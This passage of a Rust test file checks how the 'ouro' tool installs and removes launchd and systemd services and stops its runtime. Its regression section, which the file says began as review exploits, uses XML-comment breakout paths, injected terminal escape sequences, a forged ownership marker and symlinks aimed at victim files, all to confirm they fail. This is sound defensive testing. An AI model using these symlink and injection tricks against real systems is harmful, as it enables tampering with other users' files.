    // The action is required, and a request that omits it is a bad request rather than
    // a default.
    let reply = helper.ask(json!({ "op": "service" }));
    assert_eq!(reply["ok"], json!(false));

    // Every call reached the fake rather than this machine's real service manager.
    let start_command = match Platform::current().expect("a supported service platform") {
        Platform::MacOs => "launchctl bootstrap",
        Platform::Linux => "systemctl --user enable --now",
    };
    assert!(
        fakes
            .calls()
            .iter()
            .any(|call| call.starts_with(start_command)),
        "{:?}",
        fakes.calls()
    );
}

// ------------------------------------------------------------------ the idle-gated stop

/// The runtime `ouro stop` will find: a live process to own the publication, a private
/// token, and a listener that speaks the gateway's line protocol.
struct FakeRuntime {
    data_dir: PathBuf,
    token: String,
    _root: PathBuf,
    child: std::process::Child,
}

impl FakeRuntime {
    fn new(root: &Path, port: u16) -> Self {
        let data_dir = root.join("data");
        fs::create_dir_all(&data_dir).expect("a data directory");
        fs::set_permissions(&data_dir, fs::Permissions::from_mode(0o700)).expect("a private dir");

        let child = Command::new("/bin/sh")
            .args(["-c", "while :; do sleep 1; done"])
            .stdin(Stdio::null())
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .spawn()
            .expect("a process to stand in for the runtime");
        let pid = child.id() as i32;
        let birth = ouro::runtime::process_birth(pid)
            .expect("a readable incarnation")
            .expect("a live stand-in");

        let token = "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef";
        write_private(
            &data_dir.join("gateway.json"),
            &format!(
                r#"{{"port":{port},"protocol":1,"node":"nonode@nohost","pid":{pid},"birth":"{birth}","scope":"operate"}}"#
            ),
        );
        write_private(
            &data_dir.join("runtime.owner"),
            &format!(r#"{{"pid":{pid},"owner":"test-vm","birth":"{birth}"}}"#),
        );
        write_private(&data_dir.join("gateway.token"), token);

        Self {
            data_dir,
            token: token.to_string(),
            _root: root.to_path_buf(),
            child,
        }
    }

    fn stop_child(&mut self) {
        let _ = self.child.kill();
        let _ = self.child.wait();
    }
}

impl Drop for FakeRuntime {
    fn drop(&mut self) {
        self.stop_child();
    }
}

fn write_private(path: &Path, text: &str) {
    fs::write(path, text).expect("a written private file");
    fs::set_permissions(path, fs::Permissions::from_mode(0o600)).expect("a private file");
}

async fn run_stop(runtime: &FakeRuntime, args: &[&str]) -> tokio::process::Child {
    tokio::process::Command::new(OURO)
        .args(args)
        .env("OUROBOROS_DATA_DIR", &runtime.data_dir)
        .env_remove("OUROBOROS_GATEWAY_ADDR")
        .stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("the built ouro binary")
}

async fn finish(child: tokio::process::Child) -> (Option<i32>, String, String) {
    let output = child.wait_with_output().await.expect("a finished ouro");
    (
        output.status.code(),
        String::from_utf8_lossy(&output.stdout).to_string(),
        String::from_utf8_lossy(&output.stderr).to_string(),
    )
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn a_busy_runtime_refuses_the_idle_gated_stop_with_its_own_exit_code() {
    let root = scratch("stop-busy");
    let (listener, address) = support::listener().await;
    let runtime = FakeRuntime::new(&root, address.port());

    let token = runtime.token.clone();
    let server = tokio::spawn(async move {
        let mut peer = support::Peer::accept(&listener).await;
        peer.hello_with_token(&token, &["hello", "runtime.shutdown", "runtime.activity"])
            .await;
        let request = peer.request().await.expect("a shutdown call");
        assert_eq!(request["method"], "runtime.shutdown");
        assert_eq!(
            request["params"],
            json!({ "require_idle": true }),
            "the gate is the parameter, not a second method"
        );
        peer.error(
            &request["id"],
            -32004,
            "this node is still working",
            Some(json!({
                "reason": "runtime_busy",
                "activity": {
                    "idle": false,
                    "running_turns": 2,
                    "queued_turns": 1,
                    "attachment_transfers": 0,
                    "attachment_normalizations": 0,
                    "operator_clients": 1,
                    "unknown": []
                }
            })),
        )
        .await;
        // Hold the connection open so the client's exit is its own decision.
        tokio::time::sleep(Duration::from_secs(2)).await;
    });

    let child = run_stop(&runtime, &["stop", "--require-idle"]).await;
    let (code, _stdout, stderr) = finish(child).await;
    server.abort();

    assert_eq!(code, Some(10), "stderr: {stderr}");
    assert!(stderr.contains("still working"), "{stderr}");
    assert!(stderr.contains("running turns"), "{stderr}");
    assert!(
        stderr.contains("fleet service disable"),
        "the refusal points at the supervisor that would restart it: {stderr}"
    );
    // Nothing was killed: the stand-in runtime is still alive.
    assert!(ouro::runtime::pid_alive(runtime.child.id() as i32));
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn unknown_activity_refuses_with_a_different_exit_code() {
    let root = scratch("stop-unknown");
    let (listener, address) = support::listener().await;
    let runtime = FakeRuntime::new(&root, address.port());

    let token = runtime.token.clone();
    let server = tokio::spawn(async move {
        let mut peer = support::Peer::accept(&listener).await;
        peer.hello_with_token(&token, &["hello", "runtime.shutdown", "runtime.activity"])
            .await;
        let request = peer.request().await.expect("a shutdown call");
        peer.error(
            &request["id"],
            -32004,
            "this node could not establish what it is doing",
            Some(json!({
                "reason": "activity_unknown",
                "activity": {
                    "idle": null,
                    "running_turns": null,
                    "queued_turns": 0,
                    "attachment_transfers": null,
                    "attachment_normalizations": 0,
                    "operator_clients": 1,
                    "unknown": ["running_turns", "attachment_transfers"]
                }
            })),
        )
        .await;
        tokio::time::sleep(Duration::from_secs(2)).await;
    });

    let child = run_stop(&runtime, &["stop", "--require-idle"]).await;
    let (code, _stdout, stderr) = finish(child).await;
    server.abort();

    assert_eq!(code, Some(11), "stderr: {stderr}");
    assert_ne!(code, Some(10));
    assert!(stderr.contains("could not establish"), "{stderr}");
    assert!(stderr.contains("running_turns"), "{stderr}");
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn an_idle_runtime_accepts_the_gated_stop_and_the_plain_stop_is_unchanged() {
    for (args, expected) in [
        (
            vec!["stop", "--require-idle"],
            json!({ "require_idle": true }),
        ),
        (vec!["stop"], json!({})),
    ] {
        let root = scratch("stop-idle");
        let (listener, address) = support::listener().await;
        let mut runtime = FakeRuntime::new(&root, address.port());

        let token = runtime.token.clone();
        let expected_params = expected.clone();
        let (answered, answer) = tokio::sync::oneshot::channel();
        let server = tokio::spawn(async move {
            let mut peer = support::Peer::accept(&listener).await;
            peer.hello_with_token(&token, &["hello", "runtime.shutdown", "runtime.activity"])
                .await;
            let request = peer.request().await.expect("a shutdown call");
            assert_eq!(request["params"], expected_params);
            peer.result(
                &request["id"],
                json!({ "stopping": true, "node": "nonode@nohost" }),
            )
            .await;
            let _ = answered.send(());
            tokio::time::sleep(Duration::from_secs(5)).await;
        });

        let child = run_stop(&runtime, &args).await;
        // The runtime stops because it was asked to; `ouro stop` waits for the pid it
        // observed and never signals it. The stand-in only goes away once the gateway
        // has actually answered, so this proves the accepted path rather than the stale
        // publication one.
        answer.await.expect("an answered shutdown");
        runtime.stop_child();

        let (code, stdout, stderr) = finish(child).await;
        server.abort();

        assert_eq!(code, Some(0), "{args:?} stderr: {stderr}");
        assert!(stdout.contains("accepted runtime.shutdown"), "{stdout}");
        assert!(stdout.contains("the runtime stopped"), "{stdout}");
    }
}

// --------------------------------------------------------------- waiting for a network

#[test]
fn service_run_waits_for_the_profiles_address_and_a_signal_cancels_the_wait_cleanly() {
    let root = scratch("service-run-wait");
    // A private address that no interface here holds, so the bind check fails exactly
    // as it does before a VPN is up. A public literal would never get this far: the
    // profile validator refuses to advertise one at all.
    let data_dir = data_dir_with_profile(&root, "studio", "10.254.254.254");

    let mut child = Command::new(OURO)
        .args(["service-run"])
        .env("OUROBOROS_DATA_DIR", &data_dir)
        .stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("the built ouro binary");

    // The signal is sent only once the process has said it is waiting, so what is
    // cancelled here is the wait itself and not some earlier moment of startup.
    let mut errors = child.stderr.take().expect("a piped stderr");
    let (announced, waiting) = std::sync::mpsc::channel();
    let reader = std::thread::spawn(move || {
        let mut text = String::new();
        let mut buffer = [0_u8; 512];
        let mut announced = Some(announced);
        loop {
            match errors.read(&mut buffer) {
                Ok(0) | Err(_) => return text,
                Ok(read) => {
                    text.push_str(&String::from_utf8_lossy(&buffer[..read]));
                    if text.contains("waiting for network") {
                        if let Some(sender) = announced.take() {
                            let _ = sender.send(());
                        }
                    }
                }
            }
        }
    });

    waiting
        .recv_timeout(Duration::from_secs(30))
        .expect("service-run says it is waiting for the network before it starts anything");
    assert!(
        child.try_wait().expect("a waitable child").is_none(),
        "a wait is a wait, not an exit"
    );

    let pid = child.id() as i32;
    assert_eq!(unsafe { libc::kill(pid, libc::SIGTERM) }, 0);
    // Bounded, deliberately: a `service-run` whose cancellation is broken would sit in
    // its retry loop forever, and a bare `wait()` here turns that into a suite that
    // never finishes rather than a test that fails. (A mutation that removed the SIGTERM
    // arm ran for 616 seconds before this.)
    let status = wait_bounded(&mut child, Duration::from_secs(30))
        .expect("service-run exits within 30s of SIGTERM; its cancellation is broken");
    let stderr = reader.join().expect("a readable stderr");

    assert!(
        stderr.contains("waiting for network"),
        "the wait has to be visible in the unit's own log: {stderr}"
    );
    assert!(stderr.contains("10.254.254.254"), "{stderr}");
    assert_eq!(
        status.code(),
        Some(0),
        "a supervised process asked to stop exits cleanly: {stderr}"
    );
    assert!(
        stderr.contains("asked to stop while waiting"),
        "the cancelled wait says so rather than exiting silently: {stderr}"
    );
    // Nothing was started and nothing was written: no publication, no runtime owner.
    assert!(!data_dir.join("gateway.json").exists());
    assert!(!data_dir.join("runtime.owner").exists());
    assert!(data_dir.join("fleet").join("profile.json").exists());
}

// ------------------------------------------------------------------- the live Mac test

/// The one test that touches this machine's real launchd, behind an explicit opt-in.
///
/// It installs an agent for a scratch data directory under a label nothing else uses,
/// asks the real `launchctl print` whether it is there, and removes it. Two things keep
/// it safe. The plist lives in the test's own scratch home — `launchctl bootstrap
/// gui/<uid> <path>` takes any path, so the account's real `~/Library/LaunchAgents` is
/// never written to at all — and the scratch profile advertises an address no interface
/// here holds, so the agent launchd starts sits in `service-run`'s network wait for its
/// whole life and can never bring a BEAM up on this machine, embedded release or not.
/// Every exit path runs the same cleanup, including a panic.
#[test]
fn a_live_launchagent_is_installed_seen_and_removed() {
    if std::env::var_os("OUROBOROS_LIVE_LAUNCHD").as_deref() != Some(std::ffi::OsStr::new("1")) {
        eprintln!("skipping: set OUROBOROS_LIVE_LAUNCHD=1 to exercise this machine's launchd");
        return;
    }
    assert_eq!(
        std::env::consts::OS,
        "macos",
        "OUROBOROS_LIVE_LAUNCHD is a macOS opt-in"
    );

    let root = scratch("live-launchd");
    let data_dir = data_dir_with_profile(&root.join("data"), "studio", "10.254.254.254");
    let plan = plan_for(Platform::MacOs, &root, &data_dir);
    let plan = Plan {
        uid: unsafe { libc::geteuid() },
        user: std::env::var("USER").unwrap_or_else(|_| "tester".to_string()),
        ..plan
    };
    let programs = Programs::default();
    let unit = plan.unit_path();
    let label = plan.label();
    let real_agents = dirs::home_dir()
        .expect("a home directory")
        .join("Library")
        .join("LaunchAgents");
    let agents_before = listing(&real_agents);

    assert!(
        unit.starts_with(&root),
        "the live test writes inside its own scratch root, never {}",
        real_agents.display()
    );
    assert!(!unit.exists(), "{} already exists", unit.display());

    let outcome = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
        let report = fleet_service::install(&plan, &programs, false).expect("a live install");
        assert_eq!(report.ownership, Ownership::Ours);
        assert!(unit.exists());

        let printed = Command::new("launchctl")
            .args(["print", &format!("gui/{}/{label}", plan.uid)])
            .output()
            .expect("a real launchctl");
        assert!(
            printed.status.success(),
            "launchd did not see {label}: {}",
            String::from_utf8_lossy(&printed.stderr)
        );
        let printed = String::from_utf8_lossy(&printed.stdout).to_string();
        assert!(printed.contains(&label), "{printed}");
        assert!(
            printed.contains(&unit.display().to_string()),
            "launchd names the file this test wrote, and not another: {printed}"
        );

        let report = fleet_service::status(&plan, &programs).expect("a live status");
        assert_eq!(report.loaded, Some(true));
        assert_eq!(
            report.running,
            Some(true),
            "RunAtLoad means the agent is up; it is waiting for an interface that will \
             never appear, which is the whole reason this test is safe"
        );
    }));

    // Cleanup runs whether the body passed, failed an assertion, or panicked.
    let removal = fleet_service::remove(&plan, &programs);
    let _ = Command::new("launchctl")
        .args(["bootout", &format!("gui/{}/{label}", plan.uid)])
        .output();
    let _ = fs::remove_file(&unit);
    let _ = fs::remove_dir_all(&root);

    if let Err(panic) = outcome {
        std::panic::resume_unwind(panic);
    }
    removal.expect("a live removal");
    assert!(
        !unit.exists(),
        "the live test left {} behind",
        unit.display()
    );
    let printed = Command::new("launchctl")
        .args(["print", &format!("gui/{}/{label}", plan.uid)])
        .output()
        .expect("a real launchctl");
    assert!(
        !printed.status.success(),
        "launchd still has {label} loaded after removal"
    );
    assert_eq!(
        agents_before,
        listing(&real_agents),
        "the live test changed the account's own agents directory"
    );
}

// ============================================================ regressions from the review
//
// Every test below began as an adversarial exploit that passed against the first
// commit. They are kept with their assertions inverted: what each one demonstrated is
// now the thing that must not happen again. The `f<N>` in the names is the exploit each
// one came from, so a finding and its regression stay findable together.

/// F0 (H0). The proof that a whole run of this binary writes nothing into the account's
/// own service directory.
///
/// It re-runs every other test in this file as a child process and compares a listing of
/// the platform's service directory taken either side. The original slice failed exactly this:
/// the helper's `service` op built its `Plan` from the *process* environment, which the
/// fakes never redirected, and five stranded `dev.ouroboros.runtime.*.plist` files were
/// found in the developer's real agents directory afterwards.
#[test]
fn f0_a_whole_run_of_this_binary_leaves_the_real_service_directory_untouched() {
    if std::env::var_os("OUROBOROS_W2C_NESTED").is_some() {
        return;
    }
    let agents = match Platform::current() {
        Some(Platform::MacOs) => dirs::home_dir()
            .expect("a home directory")
            .join("Library/LaunchAgents"),
        Some(Platform::Linux) => dirs::config_dir()
            .expect("a config directory")
            .join("systemd/user"),
        None => return,
    };

    let root = scratch("inherited-config");
    let ambient_config = root.join("config");
    fs::create_dir_all(&ambient_config).expect("an inherited config directory");
    let before = listing(&agents);
    let output = Command::new(std::env::current_exe().expect("this test binary"))
        .args([
            "--skip",
            "f0_a_whole_run_of_this_binary",
            "--test-threads",
            "4",
        ])
        .env("OUROBOROS_W2C_NESTED", "1")
        .env("XDG_CONFIG_HOME", &ambient_config)
        .env_remove("OUROBOROS_LIVE_LAUNCHD")
        .output()
        .expect("a nested run of this binary");
    let after = listing(&agents);

    assert!(
        output.status.success(),
        "the nested run failed:\n{}\n{}",
        String::from_utf8_lossy(&output.stdout),
        String::from_utf8_lossy(&output.stderr)
    );
    assert_eq!(
        before,
        after,
        "a test in this file wrote into {}. Appeared: {:?}",
        agents.display(),
        after.difference(&before).collect::<Vec<_>>()
    );
    // Isolated children must also ignore an inherited config directory outside their HOME.
    assert!(
        listing(&ambient_config).is_empty(),
        "a test wrote into the inherited XDG_CONFIG_HOME"
    );
    fs::remove_dir_all(root).expect("the inherited config fixture");
}

fn listing(directory: &Path) -> std::collections::BTreeSet<String> {
    fs::read_dir(directory)
        .into_iter()
        .flatten()
        .flatten()
        .map(|entry| entry.file_name().to_string_lossy().to_string())
        .collect()
}

/// F1 (H1). A data directory with a space in it used to install and then read back as
/// somebody else's file, so neither `install` nor `remove` could ever touch it again.
#[test]
fn f1_an_awkwardly_named_data_directory_stays_ours_and_can_still_be_removed() {
    for name in [
        "my data",
        "a--b",
        "100% mine",
        "hash#tag",
        "quote\"here",
        "back\\slash",
        "non\u{a0}breaking",
    ] {
        let root = scratch("awkward");
        let data_dir = data_dir_with_profile(&root.join(name), "studio", "127.0.0.1");
        let fakes = Fakes::install(&root);
        let plan = plan_for(Platform::MacOs, &root, &data_dir);

        let report = fleet_service::install(&plan, &fakes.programs, false)
            .unwrap_or_else(|error| panic!("`{name}` must install: {error:#}"));
        assert_eq!(report.ownership, Ownership::Ours, "`{name}`");

        // Read back off disk, through the same marker the file carries.
        let (ownership, _digest) = fleet_service::classify(&plan).expect("a classification");
        assert_eq!(
            ownership,
            Ownership::Ours,
            "`{name}` read back as {ownership:?}"
        );

        // And both verbs still work on it.
        fleet_service::install(&plan, &fakes.programs, false).expect("a reinstall");
        fleet_service::remove(&plan, &fakes.programs)
            .unwrap_or_else(|error| panic!("`{name}` must be removable: {error:#}"));
        assert!(!plan.unit_path().exists(), "`{name}` was stranded");
    }
}

/// F3 (H2/L10). The generated plist is well-formed XML and a valid property list, even
/// when every path in it carries something the format treats specially. `--` inside an
/// XML comment is the case that used to produce a file an XML parser refuses.
#[test]
fn f3_every_generated_plist_is_well_formed_xml_and_a_valid_property_list() {
    let root = scratch("plist-lint");
    let mut plan = plan_for(Platform::MacOs, &root, &root.join("data"));

    for directory in [
        "/Users/tester/ouro--data",
        "/Users/tester/a&b \"c\" <d> é/data",
        "/Users/tester/my data/100%",
        "/Users/tester/-->escape",
    ] {
        plan.data_dir = PathBuf::from(directory);
        let text = plan.render().expect("a rendered plist");
        let path = root.join("candidate.plist");
        fs::write(&path, &text).expect("a written plist");

        let parsed = Command::new("python3")
            .args([
                "-c",
                "import plistlib, sys; plistlib.loads(open(sys.argv[1], 'rb').read())",
            ])
            .arg(&path)
            .output()
            .expect("python3 with the standard library plist parser");
        assert!(
            parsed.status.success(),
            "`{directory}` produced an invalid XML property list: {}\n{text}",
            String::from_utf8_lossy(&parsed.stderr)
        );

        #[cfg(target_os = "macos")]
        {
            let linted = Command::new("plutil")
                .args(["-lint", path.to_str().expect("utf-8")])
                .output()
                .expect("plutil on macOS");
            assert!(
                linted.status.success(),
                "`{directory}`: {}",
                String::from_utf8_lossy(&linted.stderr)
            );
        }
    }
}

/// F4 (M1). `remove` still deletes a unit of ours that was edited by hand — leaving it
/// would be the worse outcome — but it says so, with the digest of what it deleted.
#[test]
fn f4_removing_a_hand_edited_unit_says_that_it_was_edited() {
    let root = scratch("modified-remove");
    let data_dir = data_dir_with_profile(&root.join("data"), "studio", "127.0.0.1");
    let fakes = Fakes::install(&root);
    let plan = plan_for(Platform::MacOs, &root, &data_dir);
    fleet_service::install(&plan, &fakes.programs, false).expect("an install");

    let unit = plan.unit_path();
    let ours = fs::read_to_string(&unit).expect("our unit");
    fs::write(
        &unit,
        ours.replace("<integer>30</integer>", "<integer>5</integer>"),
    )
    .expect("an operator's edit");

    let report = fleet_service::remove(&plan, &fakes.programs).expect("a removal");
    assert!(!unit.exists());
    assert!(
        report
            .notes
            .iter()
            .any(|note| note.contains("edited") && note.contains("sha256")),
        "the removal must name the edit and the digest it deleted: {:?}",
        report.notes
    );
}

/// F5 (M2). One data directory is one service, whichever way the path is spelled.
#[test]
fn f5_one_data_directory_is_one_service_however_it_is_spelled() {
    let root = scratch("canon");
    let data_dir = data_dir_with_profile(&root.join("data"), "studio", "127.0.0.1");
    let fakes = Fakes::install(&root);

    let plain = plan_for(Platform::MacOs, &root, &data_dir);
    let mut slashed = plain.clone();
    slashed.data_dir = PathBuf::from(format!("{}/", data_dir.display()));
    let mut dotted = plain.clone();
    dotted.data_dir = data_dir.parent().expect("a parent").join(".").join("data");

    // And the spelling that only `fs::canonicalize` can resolve: a symbolic link to the
    // same directory. A lexical tidy-up handles the slash and the dot; nothing but a
    // real resolution handles this one.
    let link = root.join("linked-data");
    std::os::unix::fs::symlink(&data_dir, &link).expect("a symlink to the data directory");
    let mut linked = plain.clone();
    linked.data_dir = link;

    assert_eq!(plain.label(), slashed.label());
    assert_eq!(plain.label(), dotted.label());
    assert_eq!(
        plain.label(),
        linked.label(),
        "a symlinked spelling is the same directory"
    );
    assert_eq!(plain.unit_path(), slashed.unit_path());
    assert_eq!(plain.unit_path(), linked.unit_path());

    fleet_service::install(&plain, &fakes.programs, false).expect("the first install");
    fleet_service::install(&slashed, &fakes.programs, false).expect("the same install again");
    fleet_service::install(&dotted, &fakes.programs, false).expect("and again");
    fleet_service::install(&linked, &fakes.programs, false).expect("and through the link");

    let agents = plain
        .unit_path()
        .parent()
        .expect("an agents dir")
        .to_path_buf();
    assert_eq!(
        fs::read_dir(&agents).expect("a listing").count(),
        1,
        "three spellings of one directory are one service"
    );
    fleet_service::remove(&plain, &fakes.programs).expect("a removal");
    assert_eq!(fs::read_dir(&agents).expect("a listing").count(), 0);
}

/// F5b (M2). A duplicate left by an older `ouro` — a unit for the same directory under
/// another spelling — is found and named rather than silently supervising in parallel.
#[test]
fn f5b_status_names_another_managed_unit_for_the_same_data_directory() {
    let root = scratch("duplicate");
    let data_dir = data_dir_with_profile(&root.join("data"), "studio", "127.0.0.1");
    let fakes = Fakes::install(&root);
    let plan = plan_for(Platform::MacOs, &root, &data_dir);
    fleet_service::install(&plan, &fakes.programs, false).expect("an install");

    // What an older `ouro` wrote for the trailing-slash spelling: our marker, the same
    // directory, a different file name.
    let mut legacy = plan.clone();
    legacy.data_dir = PathBuf::from(format!("{}/", data_dir.display()));
    let stale = plan
        .unit_path()
        .parent()
        .expect("an agents dir")
        .join("dev.ouroboros.runtime.0123456789ab.plist");
    fs::write(&stale, legacy.render().expect("a legacy unit")).expect("a stale unit");

    let report = fleet_service::status(&plan, &fakes.programs).expect("a status");
    assert!(
        report
            .notes
            .iter()
            .any(|note| note.contains("another managed unit") && note.contains("0123456789ab")),
        "{:?}",
        report.notes
    );
}

/// F6 (M3). A manager that refuses the hand-off must not leave a RunAtLoad unit behind
/// for the next login, and its own words must not reach a terminal unfiltered.
#[test]
fn f6_a_refused_hand_off_takes_back_the_unit_it_just_wrote() {
    let root = scratch("bootstrap-fails");
    let data_dir = data_dir_with_profile(&root.join("data"), "studio", "127.0.0.1");
    let fakes = Fakes::install(&root);
    fakes.set("bootstrap_fails", true);
    let plan = plan_for(Platform::MacOs, &root, &data_dir);

    let error = fleet_service::install(&plan, &fakes.programs, false).expect_err("a refusal");
    let declared = fleet_service::service_error(&error).expect("a declared reason");
    assert_eq!(declared.reason, "manager_refused");
    assert!(
        !declared.detail.contains('\u{1b}'),
        "the manager's escape sequences must not reach a terminal: {:?}",
        declared.detail
    );
    assert!(
        declared.detail.contains("SYSTEM COMPROMISED"),
        "{declared:?}"
    );
    assert!(
        !plan.unit_path().exists(),
        "a unit the manager would not take must not be left to start at the next login"
    );

    // An install that *replaced* a unit of ours cannot restore it, so that one stays on
    // disk — and the error says so, and names the verb that removes it.
    fakes.set("bootstrap_fails", false);
    fleet_service::install(&plan, &fakes.programs, false).expect("an install");
    fakes.set("bootstrap_fails", true);
    fakes.set("loaded", false);
    let error = fleet_service::install(&plan, &fakes.programs, false).expect_err("a refusal");
    assert!(plan.unit_path().exists());
    assert!(
        format!("{error:#}").contains("fleet service remove"),
        "{error:#}"
    );

    // systemd's `enable` refusing is the same shape.
    let linux_root = scratch("masked");
    let linux_data = data_dir_with_profile(&linux_root.join("data"), "buildbox", "127.0.0.1");
    let linux_fakes = Fakes::install(&linux_root);
    linux_fakes.set("masked", true);
    let linux_plan = plan_for(Platform::Linux, &linux_root, &linux_data);
    let error = fleet_service::install(&linux_plan, &linux_fakes.programs, false)
        .expect_err("a masked unit");
    assert_eq!(
        fleet_service::service_error(&error).map(|declared| declared.reason),
        Some("manager_refused")
    );
    assert!(!linux_plan.unit_path().exists());
}

/// F7 (M6). A manager that will not disable the unit cannot make it impossible to
/// remove: the file goes, and the operator is told what is still loaded.
#[test]
fn f7_remove_deletes_its_unit_even_when_the_manager_refuses_the_disable() {
    for (platform, flag, machine) in [
        (Platform::Linux, "disable_fails", "buildbox"),
        (Platform::MacOs, "bootout_fails", "studio"),
    ] {
        let root = scratch("disable-fails");
        let data_dir = data_dir_with_profile(&root.join("data"), machine, "127.0.0.1");
        let fakes = Fakes::install(&root);
        let plan = plan_for(platform, &root, &data_dir);
        fleet_service::install(&plan, &fakes.programs, false).expect("an install");

        fakes.set(flag, true);
        let report = fleet_service::remove(&plan, &fakes.programs).expect("a removal anyway");
        assert!(
            !plan.unit_path().exists(),
            "{platform:?}: a file left behind comes back at the next login"
        );
        assert!(
            report.notes.iter().any(|note| {
                note.contains("refused to stop") && note.contains(&plan.manager_name())
            }),
            "{platform:?}: {:?}",
            report.notes
        );
    }
}

/// F8 (L7). A manager that stops answering is killed — process group and all — and
/// reported as unavailable rather than as a refusal.
#[test]
fn f8_a_manager_that_stops_answering_is_killed_with_its_children() {
    let root = scratch("slow");
    let data_dir = data_dir_with_profile(&root.join("data"), "studio", "127.0.0.1");
    let mut fakes = Fakes::install(&root);
    fakes.programs.deadline = Duration::from_millis(600);
    fakes.set("slow", true);
    let plan = plan_for(Platform::MacOs, &root, &data_dir);

    let started = Instant::now();
    let supervisor = fleet_service::detect_as(Some(Platform::MacOs), "tester", &fakes.programs);
    let elapsed = started.elapsed();

    assert!(
        elapsed < Duration::from_secs(10),
        "the deadline has to fire: {elapsed:?}"
    );
    assert_eq!(supervisor.code, fleet_service::SupervisorCode::Unsupported);
    assert!(
        supervisor
            .prerequisite
            .as_deref()
            .expect("a prerequisite")
            .contains("stopped answering"),
        "{supervisor:?}"
    );

    // The `sleep 57` the fake started is gone too, not orphaned holding the pipe. That
    // sleep is the fake's *child*: killing only the immediate process leaves it behind,
    // which is the whole reason the manager is spawned into its own process group.
    // By pid, not by pattern: the fake records the pid of the child it spawned, so this
    // asks about that exact process rather than about anything whose command line
    // happens to contain the same words.
    let orphan: i32 = fs::read_to_string(fakes.state.join("slow_child"))
        .expect("the fake recorded its child")
        .trim()
        .parse()
        .expect("a pid");
    let gone = {
        let until = Instant::now() + Duration::from_secs(3);
        loop {
            // ESRCH: no such process. A zombie still answers 0, so this polls.
            if unsafe { libc::kill(orphan, 0) } != 0 {
                break true;
            }
            if Instant::now() >= until {
                break false;
            }
            std::thread::sleep(Duration::from_millis(50));
        }
    };
    assert!(
        gone,
        "pid {orphan}, the child the manager spawned, outlived its deadline: killing the \
         immediate process is not enough"
    );
    let _ = plan;
}

/// F9 (H1). A marker is read only where this code writes one.
#[test]
fn f9_a_marker_somewhere_else_in_the_file_is_not_a_marker() {
    let root = scratch("forged-place");
    let data_dir = data_dir_with_profile(&root.join("data"), "studio", "127.0.0.1");
    let fakes = Fakes::install(&root);
    let plan = plan_for(Platform::MacOs, &root, &data_dir);
    fleet_service::install(&plan, &fakes.programs, false).expect("an install");

    let ours = fs::read_to_string(plan.unit_path()).expect("our unit");
    let marker = ours.lines().nth(2).expect("a marker line").to_string();

    // The same marker, appended to somebody else's plist instead of written at the top.
    let theirs = format!("<?xml version=\"1.0\"?>\n<!DOCTYPE plist>\n<plist/>\n{marker}\n");
    fs::write(plan.unit_path(), &theirs).expect("a forged placement");
    let (ownership, _digest) = fleet_service::classify(&plan).expect("a classification");
    assert_eq!(
        ownership,
        Ownership::Foreign,
        "a marker below the file's own content is not this code's marker"
    );
    fleet_service::remove(&plan, &fakes.programs).expect_err("and it is not ours to delete");
    assert_eq!(
        fs::read_to_string(plan.unit_path()).expect("theirs"),
        theirs
    );
}

/// F13/M15. A symlink where our unit goes is somebody else's arrangement: it is never
/// written through, and adopting replaces the link itself.
#[test]
fn f13_a_symlink_at_the_unit_path_is_foreign_and_adopting_replaces_the_link() {
    let root = scratch("symlink-unit");
    let data_dir = data_dir_with_profile(&root.join("data"), "studio", "127.0.0.1");
    let fakes = Fakes::install(&root);
    let plan = plan_for(Platform::MacOs, &root, &data_dir);

    let target = root.join("somebody-elses-file");
    fs::write(&target, "PRECIOUS\n").expect("a victim file");
    let unit = plan.unit_path();
    fs::create_dir_all(unit.parent().expect("an agents dir")).expect("an agents dir");
    std::os::unix::fs::symlink(&target, &unit).expect("a symlink at our unit path");

    assert_eq!(
        fleet_service::classify(&plan).expect("a classification").0,
        Ownership::Foreign
    );
    fleet_service::remove(&plan, &fakes.programs).expect_err("not ours to delete");
    assert!(unit.symlink_metadata().is_ok());
    assert_eq!(
        fs::read_to_string(&target).expect("the victim"),
        "PRECIOUS\n"
    );

    fleet_service::install(&plan, &fakes.programs, true).expect("an adopted install");
    assert_eq!(
        fs::read_to_string(&target).expect("the victim"),
        "PRECIOUS\n",
        "the write went through the link instead of replacing it"
    );
    assert!(fs::symlink_metadata(&unit)
        .expect("our unit")
        .file_type()
        .is_file());
}

/// F13b/M14. A symlinked service log is refused, and what it points at is untouched.
#[test]
fn f13b_a_symlinked_service_log_is_refused_and_never_followed() {
    let root = scratch("symlink-log");
    let data_dir = data_dir_with_profile(&root.join("data"), "studio", "127.0.0.1");
    let fakes = Fakes::install(&root);
    let plan = plan_for(Platform::MacOs, &root, &data_dir);

    let victim = root.join("victim.txt");
    fs::write(&victim, "PRECIOUS\n").expect("a victim");
    std::os::unix::fs::symlink(&victim, plan.err_log()).expect("a symlink");

    let error = fleet_service::install(&plan, &fakes.programs, false).expect_err("a refusal");
    assert_eq!(
        fleet_service::service_error(&error).map(|declared| declared.reason),
        Some("unusable_path")
    );
    assert!(
        format!("{error:#}").contains("symbolic link"),
        "the refusal names what it found: {error:#}"
    );
    assert_eq!(
        fs::read_to_string(&victim).expect("the victim"),
        "PRECIOUS\n"
    );
    assert!(
        !plan.unit_path().exists(),
        "nothing was installed on the way to the refusal"
    );
}

/// F13c (L6). A directory where the unit goes gets its own code, and nothing inside it
/// is disturbed.
#[test]
fn f13c_a_directory_where_the_unit_goes_is_named_rather_than_clobbered() {
    let root = scratch("dir-unit");
    let data_dir = data_dir_with_profile(&root.join("data"), "studio", "127.0.0.1");
    let fakes = Fakes::install(&root);
    let plan = plan_for(Platform::MacOs, &root, &data_dir);
    fs::create_dir_all(plan.unit_path()).expect("a directory where the unit goes");
    fs::write(plan.unit_path().join("inside"), "stuff").expect("something inside it");

    assert_eq!(
        fleet_service::classify(&plan).expect("a classification").0,
        Ownership::Foreign
    );
    let error = fleet_service::install(&plan, &fakes.programs, true).expect_err("a directory");
    assert_eq!(
        fleet_service::service_error(&error).map(|declared| declared.reason),
        Some("unit_path_is_a_directory")
    );
    assert!(plan.unit_path().join("inside").exists());
    // And no temporary file was left in the agents directory.
